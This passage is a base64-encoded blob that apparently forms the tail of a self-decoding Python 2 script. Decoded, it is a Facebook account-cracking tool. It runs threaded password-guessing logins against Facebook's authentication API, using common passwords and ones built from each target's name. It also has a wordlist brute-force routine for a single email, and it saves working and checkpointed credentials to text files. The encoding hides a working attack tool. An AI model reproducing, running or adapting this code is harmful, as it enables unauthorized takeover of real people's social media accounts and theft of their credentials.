Q0hFQ0tQT0lOVF0gXHgxYlsxOzk3bSAnICsgJ1xu4pWRSUQ6ICcgKyB1c2VyICArICdcbuKVkVBBU1M6ICcgKyBwYXNzMyArICdcbuKVmk5hbWU6ICcgKyBiWyduYW1lJ10NCgkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9DUC50eHQiLCAiYSIpDQoJCQkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczMrIlxuIikNCgkJCQkJCQkJCWNlay5jbG9zZSgpDQoJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzNCkNCgkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCXBhc3M0ID0gYlsnZmlyc3RfbmFtZSddICsgJzEyMzQ1NicNCgkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3M0KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikNCgkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoJCQkJCQkJCQkJcHJpbnQgJ1xuXHgxYlsxOzkybeKVlFtWZXJ5LkdPT0RdIFx4MWJbMTs5Mm0gJyArICdcbuKVkUlEOiAnICsgdXNlciAgKyAnXG7ilZFQQVNTOiAnICsgcGFzczQgKyAnXG7ilZpOYW1lOiAnICsgYlsnbmFtZSddDQoJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M0KQ0KCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06DQoJCQkJCQkJCQkJCXByaW50ICdcblx4MWJbMTszNjs0MG3ilZRbc29ycnkuQ0hFQ0tQT0lOVF0gXHgxYlsxOzk3bSAnICsnXG7ilZFJRDogJyArIHVzZXIgICsgJ1xu4pWRUEFTUzogJyArIHBhc3M0ICsgJ1xu4pWaTmFtZTogJyArIGJbJ25hbWUnXQ0KCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvQ1AudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczQrIlxuIikNCgkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczQpDQoJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJcGFzczUgPSAnMTIzMTIzJw0KCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCgkJCQkJCQkJCQkJCXByaW50ICdcblx4MWJbMTs5Mm3ilZRbVmVyeS5HT09EXSBceDFiWzE7OTJtICcrICdcbuKVkUlEOiAnICsgdXNlciAgKyAnXG7ilZFQQVNTOiAnICsgcGFzczUgKyAnXG7ilZpOYW1lOiAnICsgYlsnbmFtZSddDQoJCQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczUpDQoJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06DQoJCQkJCQkJCQkJCQkJcHJpbnQgJ1xuXHgxYlsxOzM2OzQwbeKVlFtzb3JyeS5DSEVDS1BPSU5UXSBceDFiWzE7OTdtJyArICdcbuKVkUlEOiAnICsgdXNlciAgKyAnXG7ilZFQQVNTOiAnICsgcGFzczUgKyAnXG7ilZpOYW1lOiAnICsgYlsnbmFtZSddDQoJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L0NQLnR4dCIsICJhIikNCgkJCQkJCQkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczUrIlxuIikNCgkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQ0KCQkJCQkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M1KQ0KCQkJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJCQlwYXNzNiA9IGJbJ2xhc3RfbmFtZSddICsgJzExMjIzMycNCgkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoJCQkJCQkJCQkJCQkJCXByaW50ICdcblx4MWJbMTs5Mm3ilZRbVmVyeS5HT09EXSBceDFiWzE7OTJtICcgKyAnXG7ilZFJRDogJyArIHVzZXIgICsgJ1xu4pWRUEFTUzogJyArIHBhc3M2ICsgJ1xu4pWaTmFtZTogJyArIGJbJ25hbWUnXQ0KCQkJCQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczYpDQoJCQkJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1xuXHgxYlsxOzM2OzQwbeKVlFtzb3JyeS5DSEVDS1BPSU5UXSBceDFiWzE7OTdtICcgKyAnXG7ilZFJRDogJyArIHVzZXIgICsgJ1xu4pWRUEFTUzogJyArIHBhc3M2ICsgJ1xu4pWaTmFtZTogJyArIGJbJ25hbWUnXQ0KCQkJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L0NQLnR4dCIsICJhIikNCgkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNisiXG4iKQ0KCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M2KQ0KCQkJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCQkJcGFzczcgPSAnMTIzNDU2NzgnDQoJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KCQkJCQkJCQkJCQkJCQkJCXByaW50ICdcblx4MWJbMTs5Mm3ilZRbVmVyeS5HT09EXSBceDFiWzE7OTJtICcgKyAnXG7ilZFJRDogJyArIHVzZXIgICsgJ1xu4pWRUEFTUzogJyArIHBhc3M3ICsgJ1xu4pWaTmFtZTogJyArIGJbJ25hbWUnXQ0KCQkJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNykNCgkJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KCQkJCQkJCQkJCQkJCQkJCQlwcmludCAnXG5ceDFiWzE7MzY7NDBt4pWUW3NvcnJ5LkNIRUNLUE9JTlRdIFx4MWJbMTs5N20gJyArICdcbuKVkUlEOiAnICsgdXNlciAgKyAnXG7ilZFQQVNTOiAnICsgcGFzczcgKyAnXG7ilZpOYW1lOiAnICsgYlsnbmFtZSddDQoJCQkJCQkJCQkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9DUC50eHQiLCAiYSIpDQoJCQkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNysiXG4iKQ0KCQkJCQkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQ0KCQkJCQkJCQkJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzNykNCgkJCQkJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCQkJCQlwYXNzOCA9ICcgMTIzNDU2Nzg5Jw0KCQkJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oDQoJCQkJCQkJCQkJCQkJCQkJCQkiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIgKyAoDQoJCQkJCQkJCQkJCQkJCQkJCQkJdXNlcikgKyAiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iICsgKA0KCQkJCQkJCQkJCQkJCQkJCQkJCXBhc3M4KSArICImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoJCQkJCQkJCQkJCQkJCQkJCQlwcmludA0KCQkJCQkJCQkJCQkJCQkJCQkJJ1xuXHgxYlsxOzkybeKVlFtWZXJ5LkdPT0RdIFx4MWJbMTs5Mm0gJyArICdcbuKVkUlEOiAnICsgdXNlciArICdcbuKVkVBBU1M6ICcgKyBwYXNzOCArICdcbuKVmk5hbWU6ICcgKyBcDQoJCQkJCQkJCQkJCQkJCQkJCQliWyduYW1lJ10NCgkJCQkJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlciArIHBhc3M4KQ0KCQkJCQkJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KCQkJCQkJCQkJCQkJCQkJCQkJCXByaW50DQoJCQkJCQkJCQkJCQkJCQkJCQkJJ1xuXHgxYlsxOzM2OzQwbeKVlFtzb3JyeS5DSEVDS1BPSU5UXSBceDFiWzE7OTdtICcgKyAnXG7ilZFJRDogJyArIHVzZXIgKyAnXG7ilZFQQVNTOiAnICsgcGFzczggKyAnXG7ilZpOYW1lOiAnICsgXA0KCQkJCQkJCQkJCQkJCQkJCQkJCWJbJ25hbWUnXQ0KCQkJCQkJCQkJCQkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9DUC50eHQiLCAiYSIpDQoJCQkJCQkJCQkJCQkJCQkJCQkJY2VrLndyaXRlKHVzZXIgKyAifCIgKyBwYXNzOCArICJcbiIpDQoJCQkJCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlciArIHBhc3M4KQ0KCQkJCQkJCQkJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJCQkJCQkJCQlwYXNzOSA9ICcxMjEyJw0KCQkJCQkJCQkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigNCgkJCQkJCQkJCQkJCQkJCQkJCQkJImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iICsgKA0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJdXNlcikgKyAiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iICsgKA0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJcGFzczkpICsgIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCQkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoJCQkJCQkJCQkJCQkJCQkJCQkJCXByaW50DQoJCQkJCQkJCQkJCQkJCQkJCQkJCSdcblx4MWJbMTs5Mm3ilZRbVmVyeS5HT09EXSBceDFiWzE7OTJtICcgKyAnXG7ilZFJRDogJyArIHVzZXIgKyAnXG7ilZFQQVNTOiAnICsgcGFzczkgKyAnXG7ilZpOYW1lOiAnICsgXA0KCQkJCQkJCQkJCQkJCQkJCQkJCQliWyduYW1lJ10NCgkJCQkJCQkJCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyICsgcGFzczkpDQoJCQkJCQkJCQkJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJcHJpbnQNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCSdcblx4MWJbMTszNjs0MG3ilZRbc29ycnkuQ0hFQ0tQT0lOVF0gXHgxYlsxOzk3bSAnICsgJ1xu4pWRSUQ6ICcgKyB1c2VyICsgJ1xu4pWRUEFTUzogJyArIHBhc3M5ICsgJ1xu4pWaTmFtZTogJyArIFwNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCWJbJ25hbWUnXQ0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L0NQLnR4dCIsICJhIikNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyICsgInwiICsgcGFzczkgKyAiXG4iKQ0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyICsgcGFzczkpDQoJCQkJCQkJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQkJCQkJCQlwYXNzMTAgPSAnMTEyMicNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIgKyAoDQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXVzZXIpICsgIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IiArICgNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJcGFzczEwKSArICImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQlwcmludA0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSdcblx4MWJbMTs5Mm3ilZRbVmVyeS5HT09EXSBceDFiWzE7OTJtICcgKyAnXG7ilZFJRDogJyArIHVzZXIgKyAnXG7ilZFQQVNTOiAnICsgcGFzczEwICsgJ1xu4pWaTmFtZTogJyArIFwNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQliWyduYW1lJ10NCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIgKyBwYXNzMTApDQoJCQkJCQkJCQkJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWw0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkiZXJyb3JfbXNnIl06DQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXByaW50DQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCSdcblx4MWJbMTszNjs0MG1b4pWUc29ycnkuQ0hFQ0tQT0lOVF0gXHgxYlsxOzk3bSAnICsgJ1xu4pWRSUQ6ICcgKyB1c2VyICsgJ1xu4pWRUEFTUzogJyArIHBhc3MxMCArICdcbuKVmk5hbWU6ICcgKyBcDQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWJbJ25hbWUnXQ0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvQ1AudHh0IiwNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkgICAiYSIpDQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSgNCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXVzZXIgKyAifCIgKyBwYXNzMTAgKyAiXG4iKQ0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQ0KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQoDQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQl1c2VyICsgcGFzczEwKQ0KCQlleGNlcHQ6CQkJCQkJCQkJCQkJCQkJCQkJDQoJCQlwYXNzDQoJCQ0KCXAgPSBUaHJlYWRQb29sKDMwKQ0KCXAubWFwKG1haW4sIGlkKSANCgkNCglwcmludCAnW+Kck10uLi4uJw0KCXByaW50ICJbKykoK10gXDAzM1sxOzMyOzQwbVZlcnkuR09PRFwwMzNbMTszNjs0MG0vXDAzM1sxOzMxOzQwbXNvcnJ5LkNIRUNLUE9JTlQgXDAzM1sxOzM2OzQwbTogXDAzM1sxOzMyOzQwbSIrc3RyKGxlbihva3MpKSsiXDAzM1sxOzM2OzQwbS9cMDMzWzE7MzE7NDBtIitzdHIobGVuKGNla3BvaW50KSkNCglwcmludCAnXDAzM1sxOzM0OzQwbVsrXSDiiJ7inJPiiIXinJPinJPinJPinJPinJMgOiBzYXZlL2NwLnR4dCcNCglwcmludCAiIiItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIiIiDQoJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUJhY2tcMDMzWzE7OTZtXSIpDQoJc3VwZXIoKQ0KDQpkZWYgYnJ1dGUoKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICB0cnk6DQogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gRWVyb3InDQogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQogICAgICAgIHRpbWUuc2xlZXAoMC41KQ0KICAgICAgICBsb2dpbigpDQogICAgZWxzZToNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIHByaW50IGxvZ28NCiAgICAgICAgcHJpbnQgJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBlbWFpbCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtSURceDFiWzE7OTdtL1x4MWJbMTs5Mm1FbWFpbCBceDFiWzE7OTdt4pyT4pyT4pyTLS0+IFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnKQ0KICAgICAgICAgICAgcGFzc3cgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybVdvcmRsaXN04pyTPD8+IFx4MWJbMTs5N21leHQobGlzdC50eHQpIFx4MWJbMTs5MW06IFx4MWJbMTs5N20nKQ0KICAgICAgICAgICAgdG90YWwgPSBvcGVuKHBhc3N3LCAncicpDQogICAgICAgICAgICB0b3RhbCA9IHRvdGFsLnJlYWRsaW5lcygpDQogICAgICAgICAgICBwcmludCAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJw0KICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm3inJPinJPinJM8Pz4gXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBlbWFpbA0KICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUFsbFx4MWJbMTs5Nm0gJyArIHN0cihsZW4odG90YWwpKSArICcgXHgxYlsxOzkybVBhc3N3b3JkIT8nDQogICAgICAgICAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1wbHogd2FpdCBceDFiWzE7OTdtLi4uJykNCiAgICAgICAgICAgIHNhbmRpID0gb3BlbihwYXNzdywgJ3InKQ0KICAgICAgICAgICAgZm9yIHB3IGluIHNhbmRpOg0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgcHcgPSBwdy5yZXBsYWNlKCdcbicsICcnKQ0KICAgICAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCdcclx4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHhiOFx4MWJbMTs5MW1dIFx4MWJbMTs5Mm1UcnkgXHgxYlsxOzk3bScgKyBwdykNCiAgICAgICAgICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nICsgZW1haWwgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcHcgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JykNCiAgICAgICAgICAgICAgICAgICAgbXBzaCA9IGpzb24ubG9hZHMoZGF0YS50ZXh0KQ0KICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBtcHNoOg0KICAgICAgICAgICAgICAgICAgICAgICAgZGFwYXQgPSBvcGVuKCdCcnV0ZS50eHQnLCAndycpDQogICAgICAgICAgICAgICAgICAgICAgICBkYXBhdC53cml0ZShlbWFpbCArICcgfCAnICsgcHcgKyAnXG4nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZGFwYXQuY2xvc2UoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtZWVyb3InDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJw0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtVXNlcm5hbWUgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBlbWFpbA0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtUGFzc3dvcmQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBwdw0KICAgICAgICAgICAgICAgICAgICAgICAga2VsdWFyKCkNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBtcHNoWydlcnJvcl9tc2cnXToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWtzID0gb3BlbignQnJ1dGVjZWtwb2ludC50eHQnLCAndycpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2Vrcy53cml0ZShlbWFpbCArICcgfCAnICsgcHcgKyAnXG4nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNla3MuY2xvc2UoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcblx4MWJbMTs5MW1bK10gXHgxYlsxOzkybUVlcm9yJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBceDFiWzE7OTNtc29ycnkgQ2hlY2twb2ludGEnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtVXNlcm5hbWUgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBlbWFpbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVBhc3N3b3JkIFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnICsgcHcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZWx1YXIoKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV1JbnRlcm5ldCcNCiAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQ0KDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV1GaWxlLj8hIScNCiAgICAgICAgICAgIHByaW50ICIiIlxuXHgxYlsxOzkxbVshXSBceDFiWzE7OTJtRWVyb3IiIiINCiAgICAgICAgICAgIHN1cGVyKCkNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCglsb2dpbigp'))